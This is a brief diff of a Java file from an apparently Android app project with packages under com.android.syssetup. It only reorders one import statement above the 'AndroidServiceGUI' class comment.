@@ -19,6 +19,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.widget.TextView;
 
+import com.android.mm.M;
 import com.android.syssetup.Core;
 import com.android.syssetup.Device;
 import com.android.syssetup.R;
@@ -28,7 +29,6 @@ import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.capabilities.PackageInfo;
 import com.android.syssetup.listener.AdR;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 /**
  * The Class AndroidServiceGUI.
